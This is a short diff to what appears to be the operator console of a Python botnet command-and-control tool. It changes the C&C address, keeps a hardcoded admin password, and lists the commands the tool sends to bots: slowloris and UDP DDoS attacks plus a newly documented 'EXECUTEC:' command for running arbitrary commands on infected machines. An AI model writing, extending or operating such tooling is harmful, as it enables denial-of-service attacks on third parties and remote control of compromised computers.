@@ -12,12 +12,12 @@ import requests, pyfiglet
 
 #----------------CONFIG ZONE------------------#
 
-ADMINSERVER = "127.0.0.1:5000"  # adress of C&C
+ADMINSERVER = "127.0.0.1:80"  # adress of C&C
 
 ADMINPASSWORD = "password"  # password to authentificate in C&C
 
 COMMANDLIST = [
-    "slowloris", "udpddos", "STOPALL", "WAIT", "SETTIMEWAIT", "PRINT", "EXECUTEC"
+    "slowloris", "udpddos", "STOPALL", "WAIT", "SETTIMEWAIT", "PRINT", "EXECUTEC:"
 ]  # commands that allowed to send in C&C, add custom command here
 
 CMDTT = (Fore.RED + "master") + (Fore.YELLOW + "@") + (
@@ -40,6 +40,7 @@ def menu():  # menu and graphics funtion
     WAIT -- Wait for commands, nothing to do
     SETTIMEWAIT <seconds> -- bot wait
     PRINT <message> -- bot print message 
+    EXECUTEC: <command>
     ==========================================
     """
 
